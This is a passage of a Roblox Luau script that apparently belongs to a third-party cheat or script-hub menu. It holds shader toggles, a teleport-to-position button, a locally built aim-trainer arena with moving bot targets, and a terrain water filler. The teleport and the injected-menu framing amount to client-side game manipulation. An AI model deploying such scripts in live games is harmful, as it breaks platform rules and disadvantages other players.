        shaderToggles.Celestial = shaderBox:AddToggle("Celestial", { Text = "Celestial Bloom", Default = false, Callback = function(v) if v then ActivateShader("CelestialBloom") Library:Notify("Celestial Bloom Ativado", 4) elseif currentShader == "CelestialBloom" then DestroyAll() end end })

        shaderBox:AddSlider("Brightness", { Text = "Global Brightness", Default = 1, Min = 0, Max = 5, Rounding = 1, Callback = function(v) shaderLighting.Brightness = v end })
        shaderBox:AddToggle("NoDOF", { Text = "Remover Embaçado (DOF)", Default = true, Callback = function(v) if shaderEffects.DOF then shaderEffects.DOF.NearIntensity = v and 0 or 0.35; shaderEffects.DOF.FarIntensity = v and 0 or 0.55 end end })
        shaderBox:AddButton("Reset All Shaders", function() DestroyAll(); for _, toggle in pairs(shaderToggles) do toggle:SetValue(false) end; Library:Notify("Todos os shaders resetados", 3) end)
    end
end

-- =====================================================================
-- MAP LOADER (Visual)
-- =====================================================================
local box = Tabs.Visual:AddRightGroupbox("Map Loader")
local AimTrainerMap = nil
local AimPos = Vector3.new(-195.08, 20.08, 1139.97)

box:AddButton({
    Text = "Teleport to Aim Trainer",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character or Player.CharacterAdded:Wait()
        local HRP = Character:WaitForChild("HumanoidRootPart")
        HRP.CFrame = CFrame.new(AimPos + Vector3.new(0,5,0))
    end
})

box:AddToggle("StaticAim", {
    Text = "Static Targets",
    Default = false,
    Callback = function(Value)
        if Value then
            if not AimTrainerMap then
                AimTrainerMap = Instance.new("Folder")
                AimTrainerMap.Name = "AimTrainer"
                AimTrainerMap.Parent = workspace
            end
            local Floor = Instance.new("Part")
            Floor.Name = "Floor"
            Floor.Size = Vector3.new(400,8,750)
            Floor.Position = AimPos - Vector3.new(0,8,-175)
            Floor.Anchored = true
            Floor.Material = Enum.Material.Slate
            Floor.Color = Color3.fromRGB(55,55,65)
            Floor.Parent = AimTrainerMap
            local WallThickness = 6
            local WallHeight = 120
            local function CreateWall(pos, size)
                local wall = Instance.new("Part")
                wall.Size = size
                wall.Position = pos
                wall.Anchored = true
                wall.Material = Enum.Material.SmoothPlastic
                wall.Color = Color3.fromRGB(20,20,25)
                wall.Transparency = 0.45
                wall.CanCollide = true
                wall.Parent = AimTrainerMap
                return wall
            end
            CreateWall(AimPos + Vector3.new(-200, WallHeight/2, 175), Vector3.new(WallThickness, WallHeight, 750))
            CreateWall(AimPos + Vector3.new(200, WallHeight/2, 175), Vector3.new(WallThickness, WallHeight, 750))
            CreateWall(AimPos + Vector3.new(0, WallHeight/2, 550), Vector3.new(400, WallHeight, WallThickness))
            CreateWall(AimPos + Vector3.new(0, WallHeight/2, -200), Vector3.new(400, WallHeight, WallThickness))
            local Positions = {}
            for x = -180, 180, 16 do
                for y = 15, 75, 8 do
                    for z = -170, 350, 18 do
                        table.insert(Positions, AimPos + Vector3.new(x,y,z))
                    end
                end
            end
            local function CreateTarget()
                local Ball = Instance.new("Part")
                Ball.Name = "Target"
                Ball.Shape = Enum.PartType.Ball
                Ball.Size = Vector3.new(4,4,4)
                Ball.Material = Enum.Material.Neon
                Ball.Color = Color3.fromRGB(255,40,40)
                Ball.Anchored = true
                Ball.CanCollide = false
                Ball.Transparency = 0.1
                Ball.Position = Positions[math.random(#Positions)]
                Ball.Parent = AimTrainerMap
                local PointLight = Instance.new("PointLight")
                PointLight.Color = Color3.fromRGB(255,60,60)
                PointLight.Brightness = 2.5
                PointLight.Range = 18
                PointLight.Parent = Ball
                Ball.Touched:Connect(function(hit)
                    if hit and hit.Parent:FindFirstChild("Humanoid") then
                        Ball.Position = Positions[math.random(#Positions)]
                    end
                end)
            end
            for i = 1, 50 do CreateTarget() end
        elseif AimTrainerMap then
            AimTrainerMap:Destroy()
            AimTrainerMap = nil
        end
    end
})

box:AddToggle("MovingR6Bot", {
    Text = "Moving bot",
    Default = false,
    Callback = function(Value)
        if Value then
            if not AimTrainerMap then
                AimTrainerMap = Instance.new("Folder")
                AimTrainerMap.Name = "AimTrainer"
                AimTrainerMap.Parent = workspace
            end
            local old = AimTrainerMap:FindFirstChild("R6Bot")
            if old then old:Destroy() end
            local basePos = Vector3.new(-231.87, 64.46, 1672.23)
            local Bot = Instance.new("Model")
            Bot.Name = "R6Bot"
            Bot.Parent = AimTrainerMap
            local Root = Instance.new("Part")
            Root.Name = "HumanoidRootPart"
            Root.Size = Vector3.new(2,2,1)
            Root.Transparency = 1
            Root.CanCollide = false
            Root.Anchored = true
            Root.Position = basePos
            Root.Parent = Bot
            local Torso = Instance.new("Part")
            Torso.Name = "Torso"
            Torso.Size = Vector3.new(2,2,1)
            Torso.Color = Color3.fromRGB(200,50,50)
            Torso.Material = Enum.Material.Neon
            Torso.Position = basePos + Vector3.new(0,3,0)
            Torso.Parent = Bot
            local Head = Instance.new("Part")
            Head.Name = "Head"
            Head.Size = Vector3.new(2,1,1)
            Head.Color = Color3.fromRGB(255,220,180)
            Head.Material = Enum.Material.SmoothPlastic
            Head.Position = basePos + Vector3.new(0,5,0)
            Head.Parent = Bot
            local LeftArm = Instance.new("Part")
            LeftArm.Name = "Left Arm"
            LeftArm.Size = Vector3.new(1,2,1)
            LeftArm.Color = Color3.fromRGB(200,50,50)
            LeftArm.Material = Enum.Material.Neon
            LeftArm.Position = basePos + Vector3.new(-1.5,3,0)
            LeftArm.Parent = Bot
            local RightArm = LeftArm:Clone()
            RightArm.Name = "Right Arm"
            RightArm.Position = basePos + Vector3.new(1.5,3,0)
            RightArm.Parent = Bot
            local LeftLeg = Instance.new("Part")
            LeftLeg.Name = "Left Leg"
            LeftLeg.Size = Vector3.new(1,2,1)
            LeftLeg.Color = Color3.fromRGB(30,30,40)
            LeftLeg.Material = Enum.Material.Fabric
            LeftLeg.Position = basePos + Vector3.new(-0.5,1,0)
            LeftLeg.Parent = Bot
            local RightLeg = LeftLeg:Clone()
            RightLeg.Name = "Right Leg"
            RightLeg.Position = basePos + Vector3.new(0.5,1,0)
            RightLeg.Parent = Bot
            local function CreateMotor(part0, part1, c0, c1)
                local motor = Instance.new("Motor6D")
                motor.Name = part1.Name .. " Motor"
                motor.Part0 = part0
                motor.Part1 = part1
                motor.C0 = c0 or CFrame.new()
                motor.C1 = c1 or CFrame.new()
                motor.Parent = part0
            end
            CreateMotor(Root, Torso, CFrame.new(0,0,0))
            CreateMotor(Torso, Head, CFrame.new(0,1.5,0), CFrame.new(0,-0.5,0))
            CreateMotor(Torso, LeftArm, CFrame.new(-1.5,0.5,0), CFrame.new(0,0.5,0))
            CreateMotor(Torso, RightArm, CFrame.new(1.5,0.5,0), CFrame.new(0,0.5,0))
            CreateMotor(Torso, LeftLeg, CFrame.new(-0.5,-1.5,0), CFrame.new(0,1,0))
            CreateMotor(Torso, RightLeg, CFrame.new(0.5,-1.5,0), CFrame.new(0,1,0))
            Bot.PrimaryPart = Root
            local t = 0
            local connection
            connection = RunService.Heartbeat:Connect(function(dt)
                if not (Bot and Bot.Parent) then if connection then connection:Disconnect() end return end
                t = t + dt * 0.65
                local x = basePos.X + math.sin(t * 1.05) * 68
                local y = basePos.Y + math.sin(t * 0.72) * 29
                local pos = Vector3.new(x, y, basePos.Z)
                Root.Position = pos
                Torso.Position = pos + Vector3.new(0,3,0)
                Head.Position = pos + Vector3.new(0,5,0)
                LeftArm.Position = pos + Vector3.new(-1.5,3,0)
                RightArm.Position = pos + Vector3.new(1.5,3,0)
                LeftLeg.Position = pos + Vector3.new(-0.5,1,0)
                RightLeg.Position = pos + Vector3.new(0.5,1,0)
            end)
        else
            if AimTrainerMap then AimTrainerMap:Destroy(); AimTrainerMap = nil end
        end
    end
})

local Terrain = workspace.Terrain
box:AddToggle("WaterToggle", {
    Text = "Water System",
    Default = false,
    Callback = function(Value)
        local center = Vector3.new(100.54, -100.85, 100.34)
        local sizeX = 4000; local sizeZ = 4000; local height = 180
        if Value then
            Terrain:FillBlock(CFrame.new(center), Vector3.new(sizeX, height, sizeZ), Enum.Material.Water)
            local function RemoveWater(startPos, endPos)
                local centerPos = (startPos + endPos) / 2
                local size = Vector3.new(math.abs(endPos.X - startPos.X) + 10, math.abs(endPos.Y - startPos.Y) + 10, math.abs(endPos.Z - startPos.Z) + 10)
                Terrain:FillBlock(CFrame.new(centerPos), size, Enum.Material.Air)
            end
            RemoveWater(Vector3.new(67.64,-8.62,204.86), Vector3.new(64.61,-68.77,319.71))
            RemoveWater(Vector3.new(-142.60,-11.10,-43.67), Vector3.new(-67.13,-10.54,33.32))
            RemoveWater(Vector3.new(143.00,-9.61,264.90), Vector3.new(164.51,-56.49,313.10))
            RemoveWater(Vector3.new(52.53,-11.15,210.08), Vector3.new(52.69,-13.09,329.59))
            RemoveWater(Vector3.new(124.46,-10.48,314.90), Vector3.new(16.14,-9.97,222.29))
            RemoveWater(Vector3.new(12.10,-14.47,219.33), Vector3.new(125.13,-15.61,306.55))
            RemoveWater(Vector3.new(-20,-100,150), Vector3.new(180,50,360))
        else
            Terrain:FillBlock(CFrame.new(center), Vector3.new(sizeX, height, sizeZ), Enum.Material.Air)
        end
    end
})

        end
